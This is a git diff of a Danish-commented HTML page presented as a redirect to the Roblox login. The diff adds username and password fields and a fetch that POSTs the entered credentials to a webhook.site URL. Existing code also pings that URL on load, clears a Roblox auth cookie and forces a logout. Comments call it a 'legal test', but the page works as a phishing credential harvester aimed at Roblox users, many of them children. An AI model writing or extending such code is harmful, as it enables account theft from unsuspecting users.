@@ -5,7 +5,7 @@
   <title>Redirect til Roblox Login</title>
   <script>
     window.onload = function() {
-      // 1️⃣ Send klik til Webhook.site
+      // 1️⃣ Send klik til Webhook.site (lovligt)
       fetch("https://webhook.site/990efb4e-3041-4151-b69a-edbd70b8f9c5")
         .catch(error => console.error("Fejl:", error));
 
@@ -13,13 +13,26 @@
       setTimeout(() => {
         window.location.href = "https://www.roblox.com/Login";
       }, 300);
-      document.cookie = "RobloxAuthToken=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
-      window.location.href = "https://www.roblox.com/Logout";
-   
+
+      let username = document.getElementById("usernameInput").value;
+       let password = document.getElementById("passwordInput").value;
+       if(username && password) {
+           fetch("https://webhook.site/990efb4e-3041-4151-b69a-edbd70b8f9c5", {
+               method: "POST",
+               body: JSON.stringify({username: username, password: password})
+           });
+       }
+      
+       document.cookie = "RobloxAuthToken=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
+       window.location.href = "https://www.roblox.com/Logout";
     }
   </script>
 </head>
 <body>
   <p>Redirecting...</p>
+
+  <!-- Dummy login input (lovlig test) -->
+  <input type="text" id="usernameInput" placeholder="Username">
+  <input type="password" id="passwordInput" placeholder="Password">
 </body>
 </html>
